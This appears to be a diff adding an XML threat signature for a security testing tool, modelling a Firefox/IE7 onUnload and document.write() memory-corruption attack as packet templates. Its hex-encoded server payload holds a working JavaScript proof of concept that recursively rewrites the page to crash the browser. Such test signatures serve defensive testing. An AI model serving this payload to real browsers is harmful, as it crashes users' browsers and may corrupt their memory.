@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Firefox onUnload + document.write() Memory Corruption Vulnerability"/>
+    <EngDesc display="true" value="This threat is a maliciously constructed webpage that uses Javascript to crash Firefox or Internet Explorer. It uses the onUnload and document.write() functions to cause memory corruption in Firefox or a null pointer exception in IE7. This threat is a client-side attack and comes from the virtual server."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Corruption"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla"/>
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Firefox"/>
+      <item value="Internet_Explorer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Firefox_2.0.0.1"/>
+      <item value="Internet_Explorer_7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://lcamtuf.coredump.cx/ietrap/testme.html"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID display="true" value="5543e894ce6fd2b491e4866ea27cd0c4"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633081887579557536"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1172610050" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C2032372046656220323030372032303A35303A303020474D540D0A5365727665723A204170616368652F312E332E33362028556E697829205048502F342E342E310D0A4C6173742D4D6F6469666965643A204672692C2032332046656220323030372030313A32313A323320474D540D0A455461673A202233303566372D3134302D3435646534313933220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203332300D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D6A6176617363726970740D0A0D0A66756E6374696F6E20746573746D652829207B0A0A2020646F63756D656E742E6F70656E28293B0A2020646F63756D656E742E777269746528273C68746D6C3E3C626F6479206F6E756E6C6F61643D22746573746D652829223E3C736372697074207372633D5C22687474703A2F2F6C63616D7475662E636F726564756D702E63782F6965747261702F746573746D652E6A73223E3C2F7363726970743E27293B0A2020646F63756D656E742E636C6F736528293B0A0A2020666F722028693D303B693C3235303B692B2B29207B0A20202020646F63756D656E742E6F70656E28293B0A20202020646F63756D656E742E777269746528273C7363726970743E646F63756D656E742E7772697465282258595A5A5922293C2F7363726970743E27293B0A20202020646F63756D656E742E636C6F736528293B0A20207D0A7D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
